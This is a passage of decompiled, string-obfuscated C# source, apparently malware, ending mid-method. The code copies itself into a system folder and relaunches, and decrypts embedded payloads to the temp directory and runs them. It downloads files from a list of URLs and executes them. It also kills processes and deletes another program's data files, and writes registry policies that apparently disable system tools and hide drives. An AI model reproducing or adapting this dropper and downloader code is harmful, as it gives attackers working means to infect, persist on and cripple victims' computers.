using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

internal class Class0
{
	private static Class14 class14_0 = new Class14();

	private static Class1.Class2 class2_0 = new Class1.Class2();

	private static Class1.Class3 class3_0 = new Class1.Class3();

	private static Class1.Class4 class4_0 = new Class1.Class4();

	private static Class1.Class5 class5_0 = new Class1.Class5();

	private static Class1.Class6 class6_0 = new Class1.Class6();

	private static Class1.Class7 class7_0 = new Class1.Class7();

	private static Class1.Class8 class8_0 = new Class1.Class8();

	private static Class1.Class9 class9_0 = new Class1.Class9();

	private static Class1.Class10 class10_0 = new Class1.Class10();

	private static Class1.Class11 class11_0 = new Class1.Class11();

	[CompilerGenerated]
	private static WaitCallback waitCallback_0;

	[CompilerGenerated]
	private static WaitCallback waitCallback_1;

	[CompilerGenerated]
	private static WaitCallback waitCallback_2;

	[CompilerGenerated]
	private static WaitCallback waitCallback_3;

	[CompilerGenerated]
	private static WaitCallback waitCallback_4;

	[CompilerGenerated]
	private static WaitCallback waitCallback_5;

	[CompilerGenerated]
	private static WaitCallback waitCallback_6;

	[CompilerGenerated]
	private static WaitCallback waitCallback_7;

	[CompilerGenerated]
	private static WaitCallback waitCallback_8;

	[CompilerGenerated]
	private static WaitCallback waitCallback_9;

	[CompilerGenerated]
	private static WaitCallback waitCallback_10;

	[CompilerGenerated]
	private static WaitCallback waitCallback_11;

	[CompilerGenerated]
	private static WaitCallback waitCallback_12;

	[CompilerGenerated]
	private static WaitCallback waitCallback_13;

	[CompilerGenerated]
	private static WaitCallback waitCallback_14;

	[CompilerGenerated]
	private static WaitCallback waitCallback_15;

	[CompilerGenerated]
	private static WaitCallback waitCallback_16;

	[CompilerGenerated]
	private static WaitCallback waitCallback_17;

	[CompilerGenerated]
	private static WaitCallback waitCallback_18;

	[CompilerGenerated]
	private static WaitCallback waitCallback_19;

	[CompilerGenerated]
	private static WaitCallback waitCallback_20;

	[CompilerGenerated]
	private static WaitCallback waitCallback_21;

	[CompilerGenerated]
	private static WaitCallback waitCallback_22;

	[CompilerGenerated]
	private static WaitCallback waitCallback_23;

	[CompilerGenerated]
	private static WaitCallback waitCallback_24;

	[CompilerGenerated]
	private static WaitCallback waitCallback_25;

	[CompilerGenerated]
	private static WaitCallback waitCallback_26;

	private static void Main(string[] args)
	{
		class14_0.Event_0 += smethod_0;
		class14_0.method_0();
		string text = _003CModule_003E.smethod_0("痲痍痚症", 30120);
		string text2 = _003CModule_003E.smethod_0("ϣΚΥβίϣ", 960);
		string s = _003CModule_003E.smethod_0("\u02df\u02f3\u02ef\u02df\u02e9\u02f5ˮ\u02ef\u02e9\u02ed\u02e7", 646);
		foreach (string text3 in args)
		{
			if (text3 == text)
			{
				StringBuilder stringBuilder = new StringBuilder();
				stringBuilder.Append(class2_0.String_0 + text2 + class2_0.String_1 + text2 + class4_0.Int32_0);
				string @string = Encoding.Default.GetString(Class12.smethod_16(Encoding.Default.GetBytes(stringBuilder.ToString()), Encoding.Default.GetBytes(s)));
				Console.WriteLine(@string);
				Process.GetCurrentProcess().Kill();
			}
		}
		class4_0.Timer_0.add_Tick((EventHandler)smethod_1);
		if (class5_0.Boolean_0)
		{
			if (Application.get_StartupPath() != Environment.GetFolderPath(class5_0.SpecialFolder_0))
			{
				switch (class5_0.Boolean_1)
				{
				case false:
					try
					{
						Class12.smethod_8(class5_0.String_0, Environment.GetFolderPath(class5_0.SpecialFolder_0) + _003CModule_003E.smethod_0("\u0097", 203) + class5_0.String_2);
						File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(class5_0.SpecialFolder_0) + _003CModule_003E.smethod_0("3", 111) + class5_0.String_2, overwrite: true);
						Process process = new Process();
						process.StartInfo = new ProcessStartInfo
						{
							Arguments = _003CModule_003E.smethod_0("ȳȲȿȹ", 636),
							FileName = Environment.GetFolderPath(class5_0.SpecialFolder_0) + _003CModule_003E.smethod_0("ŗ", 267) + class5_0.String_2
						};
						process.Start();
						Process.GetCurrentProcess().Kill();
					}
					catch (Exception ex2)
					{
						Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u02dcʓʮʵʳʦʢʿʹʸ\u02f6ʹʵʵʣʤʳʲ\u02f6\u02feʛʷʿʸ\u02ffˬ\u02f6ʭ\u02e6ʫ", 726), ex2.Message));
					}
					break;
				case true:
					try
					{
						Class12.smethod_8(class5_0.String_0, Environment.GetFolderPath(class5_0.SpecialFolder_0) + _003CModule_003E.smethod_0("ǧ", 443) + class5_0.String_2);
						Class12.smethod_6(Environment.GetFolderPath(class5_0.SpecialFolder_0) + _003CModule_003E.smethod_0("ä", 184) + class5_0.String_2, _003CModule_003E.smethod_0("ŝŜőŗ", 274));
					}
					catch (Exception ex)
					{
						Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ǵƺƇƜƚƏƋƖƐƑǟƐƜƜƊƍƚƛǟǗƲƞƖƑǖǅǟƄǏƂ", 511), ex.Message));
					}
					break;
				}
			}
			else
			{
				if (args.Length > 0 && args[0] == _003CModule_003E.smethod_0("ɣɢɯɩ", 556))
				{
					if (class7_0.Boolean_0 & class7_0.Boolean_1)
					{
						ThreadPool.QueueUserWorkItem(delegate
						{
							Class12.smethod_2<Class1.Class7.Delegate1>(_003CModule_003E.smethod_0("ʁʇʑʆˇˆˎʹʑʇʇʕʓʑʶʛʌʵ", 756))(IntPtr.Zero, class7_0.String_1, class7_0.String_0, class7_0.Int32_0);
						});
					}
					if (class9_0.Boolean_0 & class9_0.Boolean_1)
					{
						ThreadPool.QueueUserWorkItem(delegate
						{
							try
							{
								string string4 = Encoding.Default.GetString(Class12.smethod_23(Class12.smethod_4()));
								string[] separator3 = new string[1] { class9_0.String_0 };
								int num16 = 0;
								string[] array3 = string4.Split(separator3, StringSplitOptions.RemoveEmptyEntries);
								foreach (string s4 in array3)
								{
									byte[] bytes3 = Class12.smethod_17(Encoding.Default.GetBytes(s4), Encoding.Default.GetBytes(class9_0.String_1));
									string text9 = Path.GetTempPath() + _003CModule_003E.smethod_0("ź", 294) + class9_0.List_0[num16];
									File.WriteAllBytes(text9, bytes3);
									Process.Start(text9);
									num16++;
								}
							}
							catch (Exception ex25)
							{
								Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ɮȡȜȇȁȔȐȍȋȊɄȋȇȇȑȖȁȀɄɌȩȅȍȊɄɔȜȢȍȈȁȦȍȊȀȁȖɍɞɄȟɔș", 612), ex25.Message));
							}
						});
					}
					if (class10_0.Boolean_0 & class10_0.Boolean_1)
					{
						ThreadPool.QueueUserWorkItem(delegate
						{
							try
							{
								string text8 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + _003CModule_003E.smethod_0("ĲģāĔćĂĂďĲĨćĜċĈāĖĲľĜāĈćĂċĝ", 366);
								DirectoryInfo directoryInfo5 = new DirectoryInfo(text8);
								DirectoryInfo[] directories3 = directoryInfo5.GetDirectories();
								foreach (DirectoryInfo directoryInfo6 in directories3)
								{
									if (File.Exists(string.Concat(text8, _003CModule_003E.smethod_0("\u0347", 795), directoryInfo6, _003CModule_003E.smethod_0("Αή\u03a2\u03a2ΦΤΨξϣξμΡΤιΨ", 973))))
									{
										Process[] processesByName11 = Process.GetProcessesByName(_003CModule_003E.smethod_0("ˀˏ\u02d4\u02c3ˀˉ\u02de", 678));
										foreach (Process process15 in processesByName11)
										{
											process15.Kill();
											process15.WaitForExit();
										}
										Process[] processesByName12 = Process.GetProcessesByName(_003CModule_003E.smethod_0("ŗŋŒŀŎŉĊńňŉœņŎŉłŕ", 295));
										foreach (Process process16 in processesByName12)
										{
											process16.Kill();
											process16.WaitForExit();
										}
										File.Delete(string.Concat(text8, _003CModule_003E.smethod_0("Ņ", 281), directoryInfo6, _003CModule_003E.smethod_0("ȴȋȇȇȃȁȍțɆțșȄȁȜȍ", 616)));
									}
								}
							}
							catch (Exception ex24)
							{
								Console.WriteLine(string.Format(_003CModule_003E.smethod_0("û\u00b4\u0089\u0092\u0094\u0081\u0085\u0098\u009e\u009fÑ\u009e\u0092\u0092\u0084\u0083\u0094\u0095ÑÙ¼\u0090\u0098\u009fØËÑ\u008aÁ\u008c", 241), ex24.Message));
							}
						});
					}
					if (class10_0.Boolean_3 & class10_0.Boolean_4)
					{
						ThreadPool.QueueUserWorkItem(delegate
						{
							Class21.smethod_2(class10_0.String_0);
							try
							{
								Process[] processesByName9 = Process.GetProcessesByName(_003CModule_003E.smethod_0("ϞϑϊϝϞϗπ", 952));
								foreach (Process process13 in processesByName9)
								{
									process13.Kill();
								}
								Process[] processesByName10 = Process.GetProcessesByName(_003CModule_003E.smethod_0("ǟǃǚǈǆǁƂǌǀǁǛǎǆǁǊǝ", 431));
								foreach (Process process14 in processesByName10)
								{
									process14.Kill();
								}
							}
							catch (Exception ex23)
							{
								Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ϛΔΩβδΡΥθξοϱξββΤΣδεϱϹΜΰθοϸϫϱΪϡά", 977), ex23.Message));
							}
						});
					}
					if (class8_0.Boolean_0 & class8_0.Boolean_1)
					{
						ThreadPool.QueueUserWorkItem(delegate
						{
							foreach (string item in class8_0.List_0)
							{
								try
								{
									Process process12 = new Process
									{
										StartInfo = new ProcessStartInfo
										{
											FileName = item,
											UseShellExecute = true
										}
									};
									process12.Start();
								}
								catch (Exception ex22)
								{
									Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ς\u038dΰΫέθμΡΧΦϨΧΫΫνκέάϨϠ\u0385ΩΡΦϡϲϨγϸε", 968), ex22.Message));
								}
							}
						});
					}
					if (class6_0.Boolean_0 & class6_0.Boolean_1)
					{
						ThreadPool.QueueUserWorkItem(delegate
						{
							WebClient webClient3 = new WebClient();
							foreach (string item2 in class6_0.List_0)
							{
								try
								{
									string fileName3 = Path.GetTempPath() + _003CModule_003E.smethod_0("ȍ", 593) + Class12.smethod_9(5, 10) + item2.Substring(item2.LastIndexOf('.'));
									webClient3.DownloadFile(item2, fileName3);
									Process.Start(fileName3);
								}
								catch (Exception ex21)
								{
									Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ƽǲǏǔǒǇǃǞǘǙƗǘǔǔǂǅǒǓƗƟǺǖǞǙƞƍƗǌƇǊ", 439), ex21.Message));
								}
							}
						});
					}
				}
				if (class7_0.Boolean_0 & !class7_0.Boolean_1)
				{
					ThreadPool.QueueUserWorkItem(delegate
					{
						Class12.smethod_2<Class1.Class7.Delegate1>(_003CModule_003E.smethod_0("ĵĳĥĲųŲźčĥĳĳġħĥĂįĸā", 320))(IntPtr.Zero, class7_0.String_1, class7_0.String_0, class7_0.Int32_0);
					});
				}
				if (class9_0.Boolean_0 & !class9_0.Boolean_1)
				{
					ThreadPool.QueueUserWorkItem(delegate
					{
						try
						{
							string string3 = Encoding.Default.GetString(Class12.smethod_23(Class12.smethod_4()));
							string[] separator2 = new string[1] { class9_0.String_0 };
							int num9 = 0;
							string[] array2 = string3.Split(separator2, StringSplitOptions.RemoveEmptyEntries);
							foreach (string s3 in array2)
							{
								byte[] bytes2 = Class12.smethod_17(Encoding.Default.GetBytes(s3), Encoding.Default.GetBytes(class9_0.String_1));
								string text7 = Path.GetTempPath() + _003CModule_003E.smethod_0("ʍ", 721) + class9_0.List_0[num9];
								File.WriteAllBytes(text7, bytes2);
								Process.Start(text7);
								num9++;
							}
						}
						catch (Exception ex20)
						{
							Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ǻƴƉƒƔƁƅƘƞƟǑƞƒƒƄƃƔƕǑǙƼƐƘƟǑǁƉƷƘƝƔƳƘƟƕƔƃǘǋǑƊǁƌ", 497), ex20.Message));
						}
					});
				}
				if (class10_0.Boolean_0 & !class10_0.Boolean_1)
				{
					ThreadPool.QueueUserWorkItem(delegate
					{
						try
						{
							string text6 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + _003CModule_003E.smethod_0("ɴɥɇɒɁɄɄɉɴɮɁɚɍɎɇɐɴɸɚɇɎɁɄɍɛ", 552);
							DirectoryInfo directoryInfo3 = new DirectoryInfo(text6);
							DirectoryInfo[] directories2 = directoryInfo3.GetDirectories();
							foreach (DirectoryInfo directoryInfo4 in directories2)
							{
								if (File.Exists(string.Concat(text6, _003CModule_003E.smethod_0("Ʋ", 494), directoryInfo4, _003CModule_003E.smethod_0("ȜȣȯȯȫȩȥȳɮȳȱȬȩȴȥ", 576))))
								{
									Process[] processesByName7 = Process.GetProcessesByName(_003CModule_003E.smethod_0("\u034f\u0340\u035b\u034c\u034f\u0346\u0351", 809));
									foreach (Process process10 in processesByName7)
									{
										process10.Kill();
										process10.WaitForExit();
									}
									Process[] processesByName8 = Process.GetProcessesByName(_003CModule_003E.smethod_0("ʯʳʪʸʶʱ\u02f2ʼʰʱʫʾʶʱʺʭ", 735));
									foreach (Process process11 in processesByName8)
									{
										process11.Kill();
										process11.WaitForExit();
									}
									File.Delete(string.Concat(text6, _003CModule_003E.smethod_0("\"", 126), directoryInfo4, _003CModule_003E.smethod_0("\u0349Ͷͺͺ;ͼͰ\u0366\u033b\u0366\u0364\u0379ͼ\u0361Ͱ", 789)));
								}
							}
						}
						catch (Exception ex19)
						{
							Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ŅĊķĬĪĿĻĦĠġůĠĬĬĺĽĪīůŧĂĮĦġŦŵůĴſĲ", 335), ex19.Message));
						}
					});
				}
				if (class10_0.Boolean_3 & !class10_0.Boolean_4)
				{
					ThreadPool.QueueUserWorkItem(delegate
					{
						Class21.smethod_2(class10_0.String_0);
						try
						{
							Process[] processesByName5 = Process.GetProcessesByName(_003CModule_003E.smethod_0("ŌŃŘŏŌŅŒ", 298));
							foreach (Process process8 in processesByName5)
							{
								process8.Kill();
							}
							Process[] processesByName6 = Process.GetProcessesByName(_003CModule_003E.smethod_0("\u000f\u0013\n\u0018\u0016\u0011R\u001c\u0010\u0011\v\u001e\u0016\u0011\u001a\r", 127));
							foreach (Process process9 in processesByName6)
							{
								process9.Kill();
							}
						}
						catch (Exception ex18)
						{
							Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ȋɄɹɢɤɱɵɨɮɯȡɮɢɢɴɳɤɥȡȩɌɠɨɯȨȻȡɺȱɼ", 513), ex18.Message));
						}
					});
				}
				if (class6_0.Boolean_0 & !class6_0.Boolean_1)
				{
					ThreadPool.QueueUserWorkItem(delegate
					{
						WebClient webClient2 = new WebClient();
						foreach (string item3 in class6_0.List_0)
						{
							try
							{
								string fileName2 = Path.GetTempPath() + _003CModule_003E.smethod_0("ö", 170) + Class12.smethod_9(5, 10) + item3.Substring(item3.LastIndexOf('.'));
								webClient2.DownloadFile(item3, fileName2);
								Process.Start(fileName2);
							}
							catch (Exception ex17)
							{
								Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ɬȣȞȅȃȖȒȏȉȈɆȉȅȅȓȔȃȂɆɎȫȇȏȈɏɜɆȝɖț", 614), ex17.Message));
							}
						}
					});
				}
				if (class8_0.Boolean_0 & !class8_0.Boolean_1)
				{
					ThreadPool.QueueUserWorkItem(delegate
					{
						foreach (string item4 in class8_0.List_0)
						{
							try
							{
								Process process7 = new Process
								{
									StartInfo = new ProcessStartInfo
									{
										FileName = item4,
										UseShellExecute = true
									}
								};
								process7.Start();
							}
							catch (Exception ex16)
							{
								Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u0096Ùäÿùìèõóò¼óÿÿéîùø¼\u00b4Ñýõòµ¦¼ç¬á", 156), ex16.Message));
							}
						}
					});
				}
			}
		}
		else
		{
			if (class7_0.Boolean_0)
			{
				ThreadPool.QueueUserWorkItem(delegate
				{
					Class12.smethod_2<Class1.Class7.Delegate1>(_003CModule_003E.smethod_0("ŏŉşňĉĈĀŷşŉŉśŝşŸŕłŻ", 314))(IntPtr.Zero, class7_0.String_1, class7_0.String_0, class7_0.Int32_0);
				});
			}
			if (class9_0.Boolean_0)
			{
				ThreadPool.QueueUserWorkItem(delegate
				{
					try
					{
						string string2 = Encoding.Default.GetString(Class12.smethod_23(Class12.smethod_4()));
						string[] separator = new string[1] { class9_0.String_0 };
						int num2 = 0;
						string[] array = string2.Split(separator, StringSplitOptions.RemoveEmptyEntries);
						foreach (string s2 in array)
						{
							byte[] bytes = Class12.smethod_17(Encoding.Default.GetBytes(s2), Encoding.Default.GetBytes(class9_0.String_1));
							string text5 = Path.GetTempPath() + _003CModule_003E.smethod_0("Š", 316) + class9_0.List_0[num2];
							File.WriteAllBytes(text5, bytes);
							Process.Start(text5);
							num2++;
						}
					}
					catch (Exception ex15)
					{
						Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u0082Íðëíøüáçæ\u00a8çëëýúíì\u00a8\u00a0Åéáæ\u00a8\u00b8ðÎáäíÊáæìíú¡²\u00a8ó\u00b8õ", 136), ex15.Message));
					}
				});
			}
			if (class10_0.Boolean_0)
			{
				ThreadPool.QueueUserWorkItem(delegate
				{
					try
					{
						string text4 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + _003CModule_003E.smethod_0("\u0318\u0309\u032b\u033e\u032d\u0328\u0328\u0325\u0318\u0302\u032d\u0336\u0321\u0322\u032b\u033c\u0318\u0314\u0336\u032b\u0322\u032d\u0328\u0321\u0337", 836);
						DirectoryInfo directoryInfo = new DirectoryInfo(text4);
						DirectoryInfo[] directories = directoryInfo.GetDirectories();
						foreach (DirectoryInfo directoryInfo2 in directories)
						{
							if (File.Exists(string.Concat(text4, _003CModule_003E.smethod_0("5", 105), directoryInfo2, _003CModule_003E.smethod_0("\u0082½±±µ·»\u00adð\u00ad\u00af²·ª»", 222))))
							{
								Process[] processesByName3 = Process.GetProcessesByName(_003CModule_003E.smethod_0("ÛÔÏØÛÒÅ", 189));
								foreach (Process process5 in processesByName3)
								{
									process5.Kill();
									process5.WaitForExit();
								}
								Process[] processesByName4 = Process.GetProcessesByName(_003CModule_003E.smethod_0("ƍƑƈƚƔƓǐƞƒƓƉƜƔƓƘƏ", 509));
								foreach (Process process6 in processesByName4)
								{
									process6.Kill();
									process6.WaitForExit();
								}
								File.Delete(string.Concat(text4, _003CModule_003E.smethod_0("ǽ", 417), directoryInfo2, _003CModule_003E.smethod_0("ľāččĉċćđŌđēĎċĖć", 354)));
							}
						}
					}
					catch (Exception ex14)
					{
						Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ʺ\u02f5ˈ\u02d3\u02d5ˀ\u02c4\u02d9\u02df\u02deʐ\u02df\u02d3\u02d3\u02c5\u02c2\u02d5\u02d4ʐʘ\u02fdˑ\u02d9\u02deʙʊʐˋʀˍ", 688), ex14.Message));
					}
				});
			}
			if (class10_0.Boolean_3)
			{
				ThreadPool.QueueUserWorkItem(delegate
				{
					Class21.smethod_2(class10_0.String_0);
					try
					{
						Process[] processesByName = Process.GetProcessesByName(_003CModule_003E.smethod_0("\u0087\u0088\u0093\u0084\u0087\u008e\u0099", 225));
						foreach (Process process3 in processesByName)
						{
							process3.Kill();
						}
						Process[] processesByName2 = Process.GetProcessesByName(_003CModule_003E.smethod_0("\u036fͳ\u036a\u0378Ͷͱ\u0332ͼͰͱ\u036b;Ͷͱͺ\u036d", 799));
						foreach (Process process4 in processesByName2)
						{
							process4.Kill();
						}
					}
					catch (Exception ex13)
					{
						Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ι϶ϋϐϖσχϚϜϝΓϜϐϐφρϖϗΓΛϾϒϚϝΚΉΓψ\u0383ώ", 947), ex13.Message));
					}
				});
			}
			if (class6_0.Boolean_0)
			{
				ThreadPool.QueueUserWorkItem(delegate
				{
					WebClient webClient = new WebClient();
					foreach (string item5 in class6_0.List_0)
					{
						try
						{
							string fileName = Path.GetTempPath() + _003CModule_003E.smethod_0("ǿ", 419) + Class12.smethod_9(5, 10) + item5.Substring(item5.LastIndexOf('.'));
							webClient.DownloadFile(item5, fileName);
							Process.Start(fileName);
						}
						catch (Exception ex12)
						{
							Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u038bτϹϢϤϱϵϨϮϯΡϮϢϢϴϳϤϥΡΩόϠϨϯΨλΡϺαϼ", 897), ex12.Message));
						}
					}
				});
			}
			if (class8_0.Boolean_0)
			{
				ThreadPool.QueueUserWorkItem(delegate
				{
					foreach (string item6 in class8_0.List_0)
					{
						try
						{
							Process process2 = new Process
							{
								StartInfo = new ProcessStartInfo
								{
									FileName = item6,
									UseShellExecute = true
								}
							};
							process2.Start();
						}
						catch (Exception ex11)
						{
							Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u0308\u0347ͺ\u0361\u0367ͲͶ\u036b\u036d\u036c\u0322\u036d\u0361\u0361ͷͰ\u0367\u0366\u0322\u032a\u034f\u0363\u036b\u036c\u032b\u0338\u0322\u0379\u0332Ϳ", 770), ex11.Message));
						}
					}
				});
			}
		}
		if (class11_0.Boolean_0)
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				try
				{
					RegistryKey registryKey11 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("ʅʹʰʢʡʷʤʳʊʆʹʺʿʵʿʳʥʊʛʿʵʤʹʥʹʰʢʊʁʿʸʲʹʡʥʊʅʯʥʢʳʻ", 726));
					registryKey11.SetValue(_003CModule_003E.smethod_0("ƧƊƐƂƁƏƆƠƮƧ", 483), 1);
					registryKey11.Close();
				}
				catch (Exception ex10)
				{
					Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u02dbʔʩʲʴʡʥʸʾʿ\u02f1ʾʲʲʤʣʴʵ\u02f1\u02f9ʜʰʸʿ\u02f8\u02eb\u02f1ʪˡʬ", 721), ex10.Message));
				}
			});
		}
		if (class11_0.Boolean_1)
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				try
				{
					RegistryKey registryKey10 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("ɒɮɧɵɶɠɳɤɝɌɨɢɳɮɲɮɧɵɝɖɨɯɥɮɶɲɝɂɴɳɳɤɯɵɗɤɳɲɨɮɯɝɑɮɭɨɢɨɤɲɝɒɸɲɵɤɬ", 513));
					registryKey10.SetValue(_003CModule_003E.smethod_0("ʑʼʦʴʷʹʰʁʴʦʾʘʲʧ", 725), 1);
					registryKey10.Close();
				}
				catch (Exception ex9)
				{
					Console.WriteLine(string.Format(_003CModule_003E.smethod_0("řĖīİĶģħĺļĽųļİİĦġĶķųŻĞĲĺĽźũųĨţĮ", 339), ex9.Message));
				}
			});
		}
		if (class11_0.Boolean_2)
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				try
				{
					RegistryKey registryKey9 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("ˀ\u02fc\u02f5\u02e7ˤ\u02f2ˡ\u02f6ˏ\u02de\u02fa\u02f0ˡ\u02fcˠ\u02fc\u02f5\u02e7ˏ\u02c4\u02fa\u02fd\u02f7\u02fcˤˠˏː\u02e6ˡˡ\u02f6\u02fd\u02e7\u02c5\u02f6ˡˠ\u02fa\u02fc\u02fdˏ\u02c3\u02fc\u02ff\u02fa\u02f0\u02fa\u02f6ˠˏˀ\u02eaˠ\u02e7\u02f6\u02fe", 659));
					registryKey9.SetValue(_003CModule_003E.smethod_0("ǣǎǔǆǅǋǂǵǂǀǎǔǓǕǞǳǈǈǋǔ", 423), 1);
					registryKey9.Close();
				}
				catch (Exception ex8)
				{
					Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u033a\u0375\u0348\u0353\u0355\u0340\u0344\u0359\u035f\u035e\u0310\u035f\u0353\u0353\u0345\u0342\u0355\u0354\u0310\u0318ͽ\u0351\u0359\u035e\u0319\u030a\u0310\u034b\u0300\u034d", 816), ex8.Message));
				}
			});
		}
		if (class11_0.Boolean_3)
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				try
				{
					string pathRoot = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
					pathRoot = pathRoot.Replace(_003CModule_003E.smethod_0("\u034d", 887), string.Empty);
					pathRoot = pathRoot.Replace(_003CModule_003E.smethod_0("\u1ac3", 6815), string.Empty);
					int num = 0;
					string key;
					if ((key = pathRoot) != null)
					{
						if (_003CPrivateImplementationDetails_003E_007B2F0EF937_002DCC00_002D47BB_002DB0A5_002DBEAFE1B4A0DC_007D.dictionary_0 == null)
						{
							_003CPrivateImplementationDetails_003E_007B2F0EF937_002DCC00_002D47BB_002DB0A5_002DBEAFE1B4A0DC_007D.dictionary_0 = new Dictionary<string, int>(26)
							{
								{
									_003CModule_003E.smethod_0("ԓ", 1362),
									0
								},
								{
									_003CModule_003E.smethod_0("\u094d", 2319),
									1
								},
								{
									_003CModule_003E.smethod_0("≈", 8715),
									2
								},
								{
									_003CModule_003E.smethod_0("ἆ", 8002),
									3
								},
								{
									_003CModule_003E.smethod_0("ኅ", 4800),
									4
								},
								{
									_003CModule_003E.smethod_0("\u0dfe", 3512),
									5
								},
								{
									_003CModule_003E.smethod_0("\u0902", 2373),
									6
								},
								{
									_003CModule_003E.smethod_0("á", 169),
									7
								},
								{
									_003CModule_003E.smethod_0("ṭ", 7716),
									8
								},
								{
									_003CModule_003E.smethod_0("ễ", 7823),
									9
								},
								{
									_003CModule_003E.smethod_0("۷", 1724),
									10
								},
								{
									_003CModule_003E.smethod_0("\u0018", 84),
									11
								},
								{
									_003CModule_003E.smethod_0("ᓣ", 5294),
									12
								},
								{
									_003CModule_003E.smethod_0("ᢖ", 6360),
									13
								},
								{
									_003CModule_003E.smethod_0("ф", 1035),
									14
								},
								{
									_003CModule_003E.smethod_0("ᘥ", 5749),
									15
								},
								{
									_003CModule_003E.smethod_0("ₒ", 8387),
									16
								},
								{
									_003CModule_003E.smethod_0("᧥", 6583),
									17
								},
								{
									_003CModule_003E.smethod_0("◼", 9647),
									18
								},
								{
									_003CModule_003E.smethod_0("o", 59),
									19
								},
								{
									_003CModule_003E.smethod_0("෦", 3507),
									20
								},
								{
									_003CModule_003E.smethod_0("՚", 1292),
									21
								},
								{
									_003CModule_003E.smethod_0("\u19dc", 6539),
									22
								},
								{
									_003CModule_003E.smethod_0("\u0f48", 3856),
									23
								},
								{
									_003CModule_003E.smethod_0("ᤏ", 6486),
									24
								},
								{
									_003CModule_003E.smethod_0("⊅", 8927),
									25
								}
							};
						}
						if (_003CPrivateImplementationDetails_003E_007B2F0EF937_002DCC00_002D47BB_002DB0A5_002DBEAFE1B4A0DC_007D.dictionary_0.TryGetValue(key, out var value))
						{
							switch (value)
							{
							case 0:
								break;
							case 1:
								goto IL_0345;
							case 2:
								goto IL_034c;
							case 3:
								goto IL_0353;
							case 4:
								goto IL_035a;
							case 5:
								goto IL_0362;
							case 6:
								goto IL_036a;
							case 7:
								goto IL_0372;
							case 8:
								goto IL_037d;
							case 9:
								goto IL_0388;
							case 10:
								goto IL_0393;
							case 11:
								goto IL_039b;
							case 12:
								goto IL_03a3;
							case 13:
								goto IL_03ab;
							case 14:
								goto IL_03b3;
							case 15:
								goto IL_03bb;
							case 16:
								goto IL_03c3;
							case 17:
								goto IL_03cb;
							case 18:
								goto IL_03d3;
							case 19:
								goto IL_03db;
							case 20:
								goto IL_03e3;
							case 21:
								goto IL_03eb;
							case 22:
								goto IL_03f3;
							case 23:
								goto IL_03fb;
							case 24:
								goto IL_0403;
							case 25:
								goto IL_040b;
							default:
								goto IL_0413;
							}
							num = 1;
							goto IL_0415;
						}
					}
					goto IL_0413;
					IL_034c:
					num = 4;
					goto IL_0415;
					IL_0415:
					RegistryKey registryKey8 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("ࢸ\u0884\u088d\u089f\u089c\u088a\u0899\u088eࢷࢦ\u0882\u0888\u0899\u0884\u0898\u0884\u088d\u089fࢷࢼ\u0882\u0885\u088f\u0884\u089c\u0898ࢷࢨ\u089e\u0899\u0899\u088e\u0885\u089fࢽ\u088e\u0899\u0898\u0882\u0884\u0885ࢷࢻ\u0884\u0887\u0882\u0888\u0882\u088e\u0898ࢷࢮ\u0893\u089b\u0887\u0884\u0899\u088e\u0899", 2283));
					registryKey8.SetValue(_003CModule_003E.smethod_0("ಠ\u0c81ಪಜಇಘಋಝ", 3310), num);
					registryKey8.SetValue(_003CModule_003E.smethod_0("ᙨᙉᙰᙏᙃᙑᙩᙈᙢᙔᙏᙐᙃ", 5670), num);
					registryKey8.Close();
					return;
					IL_0345:
					num = 2;
					goto IL_0415;
					IL_0413:
					num = 4;
					goto IL_0415;
					IL_040b:
					num = 33554432;
					goto IL_0415;
					IL_0403:
					num = 16777216;
					goto IL_0415;
					IL_03fb:
					num = 8388608;
					goto IL_0415;
					IL_03f3:
					num = 4194304;
					goto IL_0415;
					IL_03eb:
					num = 2097152;
					goto IL_0415;
					IL_03e3:
					num = 1048576;
					goto IL_0415;
					IL_03db:
					num = 524288;
					goto IL_0415;
					IL_03d3:
					num = 262144;
					goto IL_0415;
					IL_03cb:
					num = 131072;
					goto IL_0415;
					IL_03c3:
					num = 65536;
					goto IL_0415;
					IL_03bb:
					num = 32768;
					goto IL_0415;
					IL_03b3:
					num = 16384;
					goto IL_0415;
					IL_03ab:
					num = 8192;
					goto IL_0415;
					IL_03a3:
					num = 4096;
					goto IL_0415;
					IL_039b:
					num = 2048;
					goto IL_0415;
					IL_0393:
					num = 1024;
					goto IL_0415;
					IL_0388:
					num = 512;
					goto IL_0415;
					IL_037d:
					num = 256;
					goto IL_0415;
					IL_0372:
					num = 128;
					goto IL_0415;
					IL_036a:
					num = 64;
					goto IL_0415;
					IL_0362:
					num = 32;
					goto IL_0415;
					IL_035a:
					num = 16;
					goto IL_0415;
					IL_0353:
					num = 8;
					goto IL_0415;
				}
